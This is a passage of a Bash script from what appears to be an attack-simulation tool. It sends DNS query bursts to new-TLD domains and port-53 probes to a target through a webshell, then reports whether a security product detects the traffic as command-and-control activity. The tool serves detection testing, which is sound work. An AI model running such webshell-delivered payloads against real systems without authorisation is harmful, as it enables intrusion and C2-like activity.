    fail_q=$(safe_int "$(dns_stats_field_from_line "${summary}" failed_queries)")
    generated=$(safe_int "$(dns_stats_field_from_line "${summary}" generated)")
    valid=$(safe_int "$(dns_stats_field_from_line "${summary}" valid)")
    invalid=$(safe_int "$(dns_stats_field_from_line "${summary}" invalid)")
    DNS_NEW_TLD_GENERATED="${generated}"
    DNS_NEW_TLD_VALID_FQDNS="${valid}"
    DNS_NEW_TLD_INVALID_FQDNS="${invalid}"
    tested_tlds=$(dns_stats_field_from_line "${summary}" tested_tlds)
    query_types=$(dns_stats_field_from_line "${summary}" query_types)
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        [[ "${line}" != DNS_NEW_TLD_QUERY* ]] && continue
        case "${line}" in
            *query_type=A*) a_q=$((a_q + 1)) ;;
            *query_type=AAAA*) aaaa_q=$((aaaa_q + 1)) ;;
            *query_type=HTTPS*) https_q=$((https_q + 1)) ;;
            *query_type=TXT*) txt_q=$((txt_q + 1)) ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | grep -E '^DNS_NEW_TLD_QUERY' || true)"
    if (( a_q + aaaa_q + https_q + txt_q == 0 )) && [[ -n "${query_types}" ]]; then
        a_q=$(safe_int "$(sed -n 's/.*A=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        aaaa_q=$(safe_int "$(sed -n 's/.*AAAA=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        https_q=$(safe_int "$(sed -n 's/.*HTTPS=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        txt_q=$(safe_int "$(sed -n 's/.*TXT=\([0-9]*\).*/\1/p' <<< "${query_types}")")
    fi
    DNS_NEW_TLD_TESTED_DOMAINS="${domains}"
    DNS_NEW_TLD_UNIQUE_TLDS="${unique}"
    DNS_NEW_TLD_QUERY_COUNT="${queries}"
    DNS_NEW_TLD_SUCCESSFUL_QUERIES="${ok_q}"
    DNS_NEW_TLD_FAILED_QUERIES="${fail_q}"
    DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT="${queries}"
    DNS_NEW_TLD_ACTUAL_DNS_RESPONSES=$((ok_q + fail_q))
    DNS_NEW_TLD_TESTED_TLDS="${tested_tlds}"
    DNS_NEW_TLD_QUERY_TYPES="${query_types}"
    DNS_NEW_TLD_A_QUERIES="${a_q}"
    DNS_NEW_TLD_AAAA_QUERIES="${aaaa_q}"
    DNS_NEW_TLD_HTTPS_QUERIES="${https_q}"
    DNS_NEW_TLD_TXT_QUERIES="${txt_q}"
    dns_new_tld_compute_detection_likelihood "${unique}" "${domains}"
    return 0
}

dns_new_tld_replay_structured_logs() {
    local out="$1" line=""
    ingest_remote_events "${out}" "DNS_NEW_TLD" || true
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        [[ -z "${line}" ]] && continue
        case "${line}" in
            DNS_NEW_TLD_GENERATED*)
                dns_new_tld_log_both "${line}"
                _ntld_dom=$(dns_stats_field_from_line "${line}" domain)
                [[ -n "${_ntld_dom}" ]] && dns_record_generated_fqdn "DNS_NEW_TLD" "${_ntld_dom}" "A" "new_tld"
                ;;
            DNS_NEW_TLD_PAYLOAD_BUILD_*|DNS_NEW_TLD_FQDN_VALID*|DNS_NEW_TLD_SENT*|DNS_NEW_TLD_RESPONSE*|DNS_NEW_TLD_TEST_START*|DNS_NEW_TLD_QUERY*|DNS_NEW_TLD_TLD_STATS*|DNS_NEW_TLD_SUMMARY*|DNS_NEW_TLD_ROOT_CAUSE*|DNS_NEW_TLD_FINAL_SUMMARY*|ROOT_CAUSE*)
                dns_new_tld_log_both "${line}"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_NEW_TLD_' || true)"
}

finalize_dns_new_tld_stage_judgment() {
    local stage_label="${1:-DNS New TLD Test}" detail_prefix="${2:-}"
    local summary="" decision="" reason="" detail="" stage_rc="Failed" stage_msg=""
    local resp=0 ut=0
    event_stage_mark_executed "DNS_NEW_TLD" "new_tld"
    [[ -n "${DNS_NEW_TLD_LAST_REMOTE_OUT:-}" ]] && ingest_remote_events "${DNS_NEW_TLD_LAST_REMOTE_OUT}" "DNS_NEW_TLD" || true
    validate_event_store_integrity || true
    summary=$(build_module_summary_from_events "DNS_NEW_TLD" 2>/dev/null || true)
    read -r decision reason <<< "$(validate_module_from_summary "DNS_NEW_TLD" "${summary}" "new_tld")"
    resp=$(safe_int "$(event_summary_field "${summary}" response 0)")
    ut=$(safe_int "$(event_summary_field "${summary}" unique_tld 0)")
    event_sync_legacy_counters_from_sot || true
    DNS_NEW_TLD_FINAL_RESULT="${decision}"
    DNS_NEW_TLD_SKIP_REASON="${reason}"
    case "${decision}" in
        success) stage_rc="Success"; DNS_NEW_TLD_STAGE_STATUS="Success" ;;
        partial) stage_rc="Partial"; DNS_NEW_TLD_STAGE_STATUS="Partial" ;;
        skipped) stage_rc="Skipped"; DNS_NEW_TLD_STAGE_STATUS="Skipped" ;;
        *) stage_rc="Failed"; DNS_NEW_TLD_STAGE_STATUS="Failed" ;;
    esac
    detail="${detail_prefix}response=${resp} unique_tld=${ut} ${reason}"
    set_stage_result "${stage_label}" "${stage_rc}" "${detail}"
    log_dns_query_pipeline_summary "DNS_NEW_TLD" "${DNS_NEW_TLD_FINAL_RESULT:-failed}"
    stage_msg="DNS_NEW_TLD_STAGE_FINAL_SUMMARY stage=${stage_label} status=${DNS_NEW_TLD_STAGE_STATUS} response=${resp} unique_tld=${ut} ${summary} decision=${decision} reason=${reason}"
    dns_new_tld_log_both "${stage_msg}"
}

run_dns_new_tld_test() {
    local resolver="" tool="" out="" dns_cmd="" payload_bytes=0 saved_ws_method="" domain_count=0 t0=0 t1=0
    DNS_NEW_TLD_SKIP_REASON=""
    DNS_NEW_TLD_STAGE_STATUS="skipped"
    DNS_NEW_TLD_FINAL_RESULT="skipped"
    DNS_NEW_TLD_TESTED_DOMAINS=0
    DNS_NEW_TLD_UNIQUE_TLDS=0
    DNS_NEW_TLD_QUERY_COUNT=0
    DNS_NEW_TLD_SUCCESSFUL_QUERIES=0
    DNS_NEW_TLD_FAILED_QUERIES=0
    DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT=0
    DNS_NEW_TLD_ACTUAL_DNS_RESPONSES=0
    DNS_NEW_TLD_DURATION_SECONDS=0

    if [[ "${DNS_NEW_TLD_ENABLED}" != true ]]; then
        DNS_NEW_TLD_SKIP_REASON="disabled"
        dns_new_tld_log_both "DNS new TLD test skipped (disabled)"
        return 0
    fi

    domain_count=$((20 + RANDOM % 31))
    (( domain_count < DNS_NEW_TLD_MIN_DOMAINS )) && domain_count="${DNS_NEW_TLD_MIN_DOMAINS}"
    (( domain_count > DNS_NEW_TLD_MAX_DOMAINS )) && domain_count="${DNS_NEW_TLD_MAX_DOMAINS}"

    if [[ "${DRY_RUN}" == true ]]; then
        DNS_NEW_TLD_RESOLVER="${DGA_DNS_SERVER:-10.10.10.5}"
        DNS_NEW_TLD_RESOLVER_SOURCE="${DGA_DNS_SOURCE:-scan}"
        DNS_NEW_TLD_TESTED_DOMAINS="${domain_count}"
        DNS_NEW_TLD_UNIQUE_TLDS=8
        DNS_NEW_TLD_QUERY_COUNT=$((domain_count * 4))
        DNS_NEW_TLD_SUCCESSFUL_QUERIES=$((domain_count * 4 - 2))
        DNS_NEW_TLD_FAILED_QUERIES=2
        DNS_NEW_TLD_QUERY_TYPES="A=$((domain_count))/AAAA=$((domain_count/5))/HTTPS=$((domain_count/5))/TXT=$((domain_count/5))"
        DNS_NEW_TLD_TESTED_TLDS="click fun top link xyz page icu wiki"
        DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT="${DNS_NEW_TLD_QUERY_COUNT}"
        DNS_NEW_TLD_ACTUAL_DNS_RESPONSES="${DNS_NEW_TLD_QUERY_COUNT}"
        dns_new_tld_compute_detection_likelihood 8 "${domain_count}"
        DNS_NEW_TLD_STAGE_STATUS="Success"
        DNS_NEW_TLD_FINAL_RESULT="success"
        dns_new_tld_log_both "DNS_NEW_TLD_TEST_START resolver=${DNS_NEW_TLD_RESOLVER} tool=dig planned_domains=${domain_count} dry_run=yes"
        dns_new_tld_log_both "DNS_NEW_TLD_SUMMARY tested_domains=${DNS_NEW_TLD_TESTED_DOMAINS} tested_tlds=${DNS_NEW_TLD_TESTED_TLDS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} query_count=${DNS_NEW_TLD_QUERY_COUNT} query_types=${DNS_NEW_TLD_QUERY_TYPES} successful_queries=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} failed_queries=${DNS_NEW_TLD_FAILED_QUERIES} duration_seconds=0 detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
        return 0
    fi

    if ! dns_new_tld_resolve_query_tool; then
        DNS_NEW_TLD_LAST_ROOT_CAUSE="dns_tool_missing"
        dns_new_tld_log_both "skip reason=${DNS_NEW_TLD_SKIP_REASON}"
        return 1
    fi

    resolver=$(dga_ensure_resolver) || resolver=""
    if [[ -z "${resolver}" ]]; then
        DNS_NEW_TLD_SKIP_REASON="resolver_unreachable"
        DNS_NEW_TLD_LAST_ROOT_CAUSE="resolver_unreachable"
        dns_new_tld_log_both "skip reason=${DNS_NEW_TLD_SKIP_REASON}"
        return 1
    fi
    DNS_NEW_TLD_RESOLVER="${resolver}"
    DNS_NEW_TLD_RESOLVER_SOURCE="${DGA_DNS_SOURCE:-unknown}"
    tool="${DNS_NEW_TLD_QUERY_TOOL}"
    capture_dns_server_query_baseline "${resolver}" || true

    local raw_dns_cmd="" delivery_cmd=""
    raw_dns_cmd=$(build_dns_new_tld_simulation_remote_cmd "${resolver}" "${domain_count}" "${tool}")
    if ! precheck_dns_remote_payload_syntax "${raw_dns_cmd}" "DNS_NEW_TLD_SCRIPT"; then
        DNS_NEW_TLD_SKIP_REASON="dns_query_failed"
        dns_new_tld_log_root_cause "payload_encode_failure" "DNS_PAYLOAD_SYNTAX_ERROR local_or_remote_precheck"
        return 1
    fi
    if ! delivery_cmd=$(dns_new_tld_build_webshell_delivery "${raw_dns_cmd}" "DNS_NEW_TLD_SCRIPT"); then
        DNS_NEW_TLD_SKIP_REASON="dns_query_failed"
        dns_new_tld_log_root_cause "payload_encode_failure" "DNS_NEW_TLD_PAYLOAD_BUILD_ERROR"
        return 1
    fi
    dns_cmd="${delivery_cmd}"
    payload_bytes=${#dns_cmd}
    saved_ws_method="${WEBSHELL_METHOD}"
    DNS_NEW_TLD_LAST_PAYLOAD_BYTES="${payload_bytes}"
    DNS_NEW_TLD_LAST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
    webshell_apply_payload_transport "DNS_NEW_TLD" "${payload_bytes}"
    DNS_NEW_TLD_LAST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
    dns_new_tld_log_both "DNS_NEW_TLD_PAYLOAD_TRANSPORT payload_bytes=${payload_bytes} webshell_method=${WEBSHELL_METHOD:-GET} limit=${PAYLOAD_FORCE_POST_BYTES:-${PAYLOAD_WARN_BYTES}} planned_domains=${domain_count}"
    t0=$(date +%s)
    out=$(run_webshell_long "dns-new-tld-test" "${dns_cmd}" 2>/dev/null || true)
    webshell_restore_active_transport "${saved_ws_method}"
    DNS_NEW_TLD_LAST_REMOTE_OUT="${out}"
    DNS_NEW_TLD_LAST_REMOTE_PAYLOAD="${dns_cmd}"
    t1=$(date +%s)
    DNS_NEW_TLD_DURATION_SECONDS=$((t1 - t0))

    if [[ -z "${out}" || "${out}" != *"DNS_NEW_TLD_SUMMARY"* ]]; then
        DNS_NEW_TLD_SKIP_REASON=$(dns_new_tld_classify_failure_root_cause "${out}" "${dns_cmd}")
        dns_new_tld_log_root_cause "${DNS_NEW_TLD_SKIP_REASON}" "simulation_output_missing_or_incomplete"
        poc_log_root_cause_analysis "DNS_NEW_TLD" "${dns_cmd}" "${out}"
        dns_new_tld_log_both "simulation_failed reason=${DNS_NEW_TLD_SKIP_REASON}"
        return 1
    fi

    dns_new_tld_replay_structured_logs "${out}"
    parse_dns_new_tld_output "${out}" || true
    finalize_dns_server_query_observation "${resolver}" "${DNS_NEW_TLD_QUERY_COUNT}" \
        "${DNS_NEW_TLD_ACTUAL_DNS_RESPONSES:-${DNS_NEW_TLD_SUCCESSFUL_QUERIES}}" "DNS_NEW_TLD" || true
    local summary_line=""
    summary_line=$(printf '%s\n' "${out}" | grep -E '^DNS_NEW_TLD_SUMMARY' | tail -n1 || true)
    if [[ -n "${summary_line}" ]]; then
        summary_line="${summary_line/SUMMARY tested_domains=/SUMMARY tested_domains=}"
        summary_line=$(printf '%s' "${summary_line}" | sed "s/duration_seconds=[0-9]*/duration_seconds=${DNS_NEW_TLD_DURATION_SECONDS}/")
        summary_line=$(printf '%s' "${summary_line}" | sed "s/detection_likelihood=[A-Z]*/detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}/")
        dns_new_tld_log_both "${summary_line#DNS_NEW_TLD_}"
        dns_new_tld_log_both "DNS_NEW_TLD_SUMMARY tested_domains=${DNS_NEW_TLD_TESTED_DOMAINS} tested_tlds=${DNS_NEW_TLD_TESTED_TLDS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} query_count=${DNS_NEW_TLD_QUERY_COUNT} query_types=${DNS_NEW_TLD_QUERY_TYPES} successful_queries=${DNS_NEW_TLD_SUCCESSFUL_QUERIES} failed_queries=${DNS_NEW_TLD_FAILED_QUERIES} duration_seconds=${DNS_NEW_TLD_DURATION_SECONDS} detection_likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
    fi
    if (( DNS_NEW_TLD_SUCCESSFUL_QUERIES == 0 && DNS_NEW_TLD_QUERY_COUNT > 0 )); then
        dns_new_tld_log_root_cause "resolver_failure" "all_queries_failed_or_timeout"
    elif (( DNS_NEW_TLD_UNIQUE_TLDS < 5 || DNS_NEW_TLD_SUCCESSFUL_QUERIES < 10 )); then
        dns_new_tld_log_root_cause "${DNS_NEW_TLD_DETECTION_REASON:-below_success_threshold}" "unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} successful=${DNS_NEW_TLD_SUCCESSFUL_QUERIES}"
    fi
    return 0
}

followup_stage_dns_new_tld() {
    local sim_rc=0
    [[ "${DNS_NEW_TLD_ENABLED}" != true ]] && {
        add_skipped_stage "DNS New TLD Test" "disabled (--disable-dns-new-tld)"
        set_stage_result "DNS New TLD Test" "Skipped" "disabled"
        DNS_NEW_TLD_STAGE_STATUS="skipped"
        DNS_NEW_TLD_SKIP_REASON="disabled"
        write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "skipped" "disabled"
        poc_run_dns_new_tld_live_log_validation || true
        return 0
    }
    poc_obs_stage_start "DNS New TLD Test"
    add_executed_stage "DNS New TLD Test"
    write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "start" "new-TLD DNS query burst (dns_new_tld analytics validation)"
    if [[ "${DRY_RUN}" != true && "${DNS_ENVIRONMENT_BLOCKED}" == true ]]; then
        DNS_NEW_TLD_STAGE_STATUS="Failed"
        DNS_NEW_TLD_FINAL_RESULT="failed"
        DNS_NEW_TLD_SKIP_REASON="ENVIRONMENT_BLOCKED ${DNS_ENVIRONMENT_BLOCK_REASON}"
        set_stage_result "DNS New TLD Test" "Failed" "${DNS_NEW_TLD_SKIP_REASON}"
        write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "failed" "ENVIRONMENT_BLOCKED"
        poc_run_dns_new_tld_live_log_validation || true
        poc_obs_stage_end "DNS New TLD Test"
        return 1
    fi
    sim_rc=0
    run_dns_new_tld_test || sim_rc=$?
    finalize_dns_new_tld_stage_judgment "DNS New TLD Test" "dns_new_tld "
    case "${DNS_NEW_TLD_STAGE_STATUS}" in
        Success)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "success" "domains=${DNS_NEW_TLD_TESTED_DOMAINS} unique_tlds=${DNS_NEW_TLD_UNIQUE_TLDS} likelihood=${DNS_NEW_TLD_DETECTION_LIKELIHOOD}"
            ;;
        Partial)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "partial" "${DNS_NEW_TLD_DETECTION_REASON:-partial}"
            ;;
        Skipped)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "skipped" "${DNS_NEW_TLD_SKIP_REASON:-skipped}"
            ;;
        *)
            write_report_entries "dns_new_tld" "T1071" "NDR/SIEM" "DNS New TLD Test" "${TARGET_NET}" "failed" "${DNS_NEW_TLD_SKIP_REASON:-failed}"
            ;;
    esac
    poc_run_dns_new_tld_live_log_validation || true
    poc_obs_stage_end "DNS New TLD Test"
    return "${sim_rc}"
}

write_dns_new_tld_report() {
    [[ -z "${REPORT_MD}" ]] && return 0
    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## DNS New TLD Test

| Field | Value |
|---|---|
| Resolver | ${DNS_NEW_TLD_RESOLVER:-n/a} (source=${DNS_NEW_TLD_RESOLVER_SOURCE:-unknown}) |
| Query tool | ${DNS_NEW_TLD_QUERY_TOOL:-n/a} |
| Tested domains | ${DNS_NEW_TLD_TESTED_DOMAINS:-0} |
| Tested TLDs | ${DNS_NEW_TLD_TESTED_TLDS:-n/a} |
| Unique TLDs | ${DNS_NEW_TLD_UNIQUE_TLDS:-0} |
| Query count | ${DNS_NEW_TLD_QUERY_COUNT:-0} |
| Query types (A/AAAA/HTTPS/TXT) | ${DNS_NEW_TLD_A_QUERIES:-0} / ${DNS_NEW_TLD_AAAA_QUERIES:-0} / ${DNS_NEW_TLD_HTTPS_QUERIES:-0} / ${DNS_NEW_TLD_TXT_QUERIES:-0} |
| Successful queries | ${DNS_NEW_TLD_SUCCESSFUL_QUERIES:-0} |
| Failed queries | ${DNS_NEW_TLD_FAILED_QUERIES:-0} |
| Duration (seconds) | ${DNS_NEW_TLD_DURATION_SECONDS:-0} |
| Detection likelihood | ${DNS_NEW_TLD_DETECTION_LIKELIHOOD:-LOW} |
| Skip / failure reason | ${DNS_NEW_TLD_SKIP_REASON:-none} |

### Expected Stellar detection
- **Event:** \`dns_new_tld\` (subtype \`dns_new_tld_sensor\`)
- **Kill chain:** Initial Attempts
- **Tactic / Technique:** TA0011 Command and Control / T1071 Application Layer Protocol
- **Also likely:** DNS Anomaly, Top-Level Domain Anomaly
- **Severity reference:** 20

EOF
}

evaluate_dns_visibility_gate() {
    local valid_resp=0 resp_recv=0
    valid_resp=$(safe_int "${DNS_VISIBILITY_VALID_RESPONSE:-0}")
    resp_recv=$(safe_int "${DNS_VISIBILITY_RESPONSE:-0}")
    if (( valid_resp >= 1 || resp_recv > 0 )); then
        DNS_VISIBILITY_DECISION="visible"
        DNS_ENVIRONMENT_BLOCKED=false
        DNS_ENVIRONMENT_BLOCK_REASON=""
        return 0
    fi
    DNS_VISIBILITY_DECISION="blocked"
    DNS_VISIBILITY_FAILURE_REASON="${DNS_VISIBILITY_FAILURE_REASON:-no_dns_responses}"
    DNS_ENVIRONMENT_BLOCKED=true
    DNS_ENVIRONMENT_BLOCK_REASON="${DNS_VISIBILITY_FAILURE_REASON}"
    return 1
}

dns_visibility_block_all_dns_modules() {
    local reason="${1:-dns_visibility_failed}"
    DNS_ENVIRONMENT_BLOCKED=true
    DNS_ENVIRONMENT_BLOCK_REASON="${reason}"
    DNS_VISIBILITY_DECISION="blocked"
    DNS_VISIBILITY_FAILURE_REASON="${reason}"
    return 0
}

run_dns_visibility_validation() {
    dns_tunnel_guard_legacy_call "dns visibility validation" && return 1
    local resolver="$1" tool="${DNS_TUNNEL_QUERY_TOOL:-dig}" out="" dns_cmd="" fqdn="" qtype="" result=""
    local seed_domains="google.com microsoft.com amazon.com"
    local invalid_seed="" invalid_seed2="" latency_sum=0 latency_n=0 latency_ms=0 avg_latency=0 success_rate=0 decision="" failure_reason=""
    invalid_seed="xxxxx-$(rand_bytes 3 2>/dev/null | tr -dc 'a-z0-9' | head -c 6 2>/dev/null || echo invalidtest).com"
    invalid_seed2="yyyyyy-$(rand_bytes 3 2>/dev/null | tr -dc 'a-z0-9' | head -c 6 2>/dev/null || echo invalidtest).net"
    DNS_VISIBILITY_GENERATED=0
    DNS_VISIBILITY_SENT=0
    DNS_VISIBILITY_RESPONSE=0
    DNS_VISIBILITY_TIMEOUT=0
    DNS_VISIBILITY_ERROR=0
    DNS_VISIBILITY_VALID_SENT=0
    DNS_VISIBILITY_VALID_RESPONSE=0
    DNS_VISIBILITY_INVALID_SENT=0
    DNS_VISIBILITY_INVALID_NXDOMAIN=0
    DNS_VISIBILITY_FAILURE_REASON=""
    DNS_VISIBILITY_AVG_LATENCY_MS=0
    DNS_VISIBILITY_SUCCESS_RATE=0
    DNS_VISIBILITY_DECISION=""
    DNS_RESOLVER_IP="${resolver}"
    DNS_RESOLVER_TYPE="${tool}"
    [[ -z "${resolver}" ]] && return 1
    dns_tunnel_log_both "DNS_VISIBILITY_TEST_START resolver=${resolver} tool=${tool}"
    state_append "dns_visibility_validation.log" "DNS_VISIBILITY_TEST_START resolver=${resolver} tool=${tool}"
    dns_cmd=$(cat <<EOF
srv='${resolver}'
tool='${tool}'
dns_to(){ case "\$1" in *timed\ out*|*TIMEOUT*|*refused*|*unreachable*) return 0;; esac; return 1; }
dns_nx(){ case "\$1" in *NXDOMAIN*|*"not found"*|*"can't find"*) return 0;; esac; return 1; }
run_vq(){
local fq="\$1" qt="\$2" kind="\$3" out="" rc=0 result="error" rcode="ERROR" t0=0 t1=0 latency_ms=0
t0=\$(date +%s%3N 2>/dev/null || date +%s)
printf 'QUERY_GENERATED fqdn=%s qtype=%s stage=dns_visibility_validation kind=%s\n' "\$fq" "\$qt" "\$kind"
if [ "\$tool" = nslookup ]; then
    if ! command -v nslookup >/dev/null 2>&1; then printf 'QUERY_ERROR fqdn=%s reason=nslookup_missing kind=%s\n' "\$fq" "\$kind"; printf 'DNS_VISIBILITY_RESULT resolver=%s query=%s qtype=%s rcode=TOOL_MISSING latency_ms=0 kind=%s\n' "\$srv" "\$fq" "\$qt" "\$kind"; return 0; fi
    out=\$(nslookup -timeout=2 "\$fq" "\$srv" 2>&1)
elif [ "\$tool" = host ]; then
    if ! command -v host >/dev/null 2>&1; then printf 'QUERY_ERROR fqdn=%s reason=host_missing kind=%s\n' "\$fq" "\$kind"; printf 'DNS_VISIBILITY_RESULT resolver=%s query=%s qtype=%s rcode=TOOL_MISSING latency_ms=0 kind=%s\n' "\$srv" "\$fq" "\$qt" "\$kind"; return 0; fi
    out=\$(host -W 2 -t "\$qt" "\$fq" "\$srv" 2>&1)
else
    if ! command -v dig >/dev/null 2>&1; then printf 'QUERY_ERROR fqdn=%s reason=dig_missing kind=%s\n' "\$fq" "\$kind"; printf 'DNS_VISIBILITY_RESULT resolver=%s query=%s qtype=%s rcode=TOOL_MISSING latency_ms=0 kind=%s\n' "\$srv" "\$fq" "\$qt" "\$kind"; return 0; fi
    out=\$(dig +time=2 +tries=1 @"\$srv" "\$fq" "\$qt" +noall +answer +comments 2>&1); fi
rc=\$?
t1=\$(date +%s%3N 2>/dev/null || date +%s)
latency_ms=\$((t1 - t0))
printf 'QUERY_SENT fqdn=%s qtype=%s stage=dns_visibility_validation kind=%s\n' "\$fq" "\$qt" "\$kind"
if dns_to "\$out"; then result=timeout; rcode=TIMEOUT; printf 'QUERY_TIMEOUT fqdn=%s qtype=%s stage=dns_visibility_validation kind=%s\n' "\$fq" "\$qt" "\$kind"
elif dns_nx "\$out"; then result=nxdomain; rcode=NXDOMAIN; printf 'DNS_QUERY_NXDOMAIN fqdn=%s qtype=%s kind=%s\n' "\$fq" "\$qt" "\$kind"
elif [ -n "\$out" ]; then result=resolved; rcode=NOERROR
else result=error; rcode=ERROR; printf 'QUERY_ERROR fqdn=%s qtype=%s stage=dns_visibility_validation reason=empty_response kind=%s\n' "\$fq" "\$qt" "\$kind"; fi
printf 'QUERY_RESPONSE fqdn=%s qtype=%s stage=dns_visibility_validation rcode=%s kind=%s\n' "\$fq" "\$qt" "\$result" "\$kind"
printf 'DNS_VISIBILITY_RESULT resolver=%s query=%s qtype=%s rcode=%s latency_ms=%s kind=%s\n' "\$srv" "\$fq" "\$qt" "\$rcode" "\$latency_ms" "\$kind"
}
for d in ${seed_domains}; do run_vq "\$d" A valid; done
run_vq "${invalid_seed}" A invalid
run_vq "${invalid_seed2}" A invalid
probe_dns_port(){
local proto="\$1" port="\$2" res=blocked
if command -v nc >/dev/null 2>&1; then
    if [ "\$proto" = udp ]; then
    nc -u -z -w2 "\$srv" "\$port" 2>/dev/null && res=open
    else
    nc -z -w2 "\$srv" "\$port" 2>/dev/null && res=open
    fi
elif [ "\$proto" = tcp ] && command -v dig >/dev/null 2>&1; then
    dig +time=2 +tries=1 +tcp @"\$srv" google.com A +noall +answer >/dev/null 2>&1 && res=open
elif command -v dig >/dev/null 2>&1; then
    dig +time=2 +tries=1 @"\$srv" google.com A +noall +answer >/dev/null 2>&1 && res=open
fi
printf 'DNS_VISIBILITY_PORT_PROBE resolver=%s proto=%s port=%s result=%s\n' "\$srv" "\$proto" "\$port" "\$res"
}
probe_dns_port udp 53
probe_dns_port tcp 53
EOF
)
    out=$(run_webshell_quick "dns-visibility-validation" "${dns_cmd}" 2>/dev/null || true)
    if [[ "${out}" == *webshell*failed* || "${out}" == *WEBSHELL*FAIL* ]]; then
        DNS_VISIBILITY_FAILURE_REASON=webshell_execution_failure
    fi
    while IFS= read -r line; do
        [[ "${line}" != DNS_VISIBILITY_RESULT* ]] && continue
        latency_ms=$(safe_int "$(dns_stats_field_from_line "${line}" latency_ms)")
        (( latency_ms > 0 )) && { latency_sum=$((latency_sum + latency_ms)); latency_n=$((latency_n + 1)); }
        dns_tunnel_log_both "${line}"
        state_append "dns_visibility_validation.log" "${line}"
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_VISIBILITY_RESULT' || true)"
    while IFS= read -r line; do
        [[ "${line}" != DNS_VISIBILITY_PORT_PROBE* ]] && continue
        dns_tunnel_log_both "${line}"
        state_append "dns_visibility_validation.log" "${line}"
        case "${line}" in
            *proto=udp*) DNS_VISIBILITY_UDP53_PROBE=$(dns_stats_field_from_line "${line}" result) ;;
            *proto=tcp*) DNS_VISIBILITY_TCP53_PROBE=$(dns_stats_field_from_line "${line}" result) ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_VISIBILITY_PORT_PROBE' || true)"
    DNS_VISIBILITY_GENERATED=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_GENERATED ' || true)
    DNS_VISIBILITY_SENT=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_SENT ' || true)
    DNS_VISIBILITY_RESPONSE=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_RESPONSE ' || true)
    DNS_VISIBILITY_TIMEOUT=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_TIMEOUT ' || true)
    DNS_VISIBILITY_ERROR=$(printf '%s\n' "${out}" | tr -d '\r' | grep -c '^QUERY_ERROR ' || true)
    DNS_VISIBILITY_VALID_SENT=$(printf '%s\n' "${out}" | tr -d '\r' | grep -cE 'QUERY_SENT .*kind=valid' || true)
    DNS_VISIBILITY_INVALID_SENT=$(printf '%s\n' "${out}" | tr -d '\r' | grep -cE 'QUERY_SENT .*kind=invalid' || true)
    DNS_VISIBILITY_VALID_RESPONSE=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_VISIBILITY_RESULT' | grep -cE 'rcode=NOERROR .*kind=valid' || true)
    (( DNS_VISIBILITY_VALID_RESPONSE == 0 )) && DNS_VISIBILITY_VALID_RESPONSE=$(printf '%s\n' "${out}" | tr -d '\r' | grep -cE 'QUERY_RESPONSE .*rcode=resolved .*kind=valid' || true)
    DNS_VISIBILITY_INVALID_NXDOMAIN=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E '^DNS_VISIBILITY_RESULT' | grep -cE 'rcode=NXDOMAIN .*kind=invalid' || true)
    (( DNS_VISIBILITY_INVALID_NXDOMAIN == 0 )) && DNS_VISIBILITY_INVALID_NXDOMAIN=$(printf '%s\n' "${out}" | tr -d '\r' | grep -cE 'QUERY_RESPONSE .*rcode=nxdomain .*kind=invalid' || true)
    DNS_VISIBILITY_GENERATED=$(safe_int "${DNS_VISIBILITY_GENERATED}")
    DNS_VISIBILITY_SENT=$(safe_int "${DNS_VISIBILITY_SENT}")
    DNS_VISIBILITY_RESPONSE=$(safe_int "${DNS_VISIBILITY_RESPONSE}")
    DNS_VISIBILITY_TIMEOUT=$(safe_int "${DNS_VISIBILITY_TIMEOUT}")
    DNS_VISIBILITY_ERROR=$(safe_int "${DNS_VISIBILITY_ERROR}")
    DNS_VISIBILITY_VALID_SENT=$(safe_int "${DNS_VISIBILITY_VALID_SENT}")
    DNS_VISIBILITY_VALID_RESPONSE=$(safe_int "${DNS_VISIBILITY_VALID_RESPONSE}")
    DNS_VISIBILITY_INVALID_SENT=$(safe_int "${DNS_VISIBILITY_INVALID_SENT}")
    DNS_VISIBILITY_INVALID_NXDOMAIN=$(safe_int "${DNS_VISIBILITY_INVALID_NXDOMAIN}")
    (( latency_n > 0 )) && avg_latency=$((latency_sum / latency_n))
    DNS_VISIBILITY_AVG_LATENCY_MS="${avg_latency}"
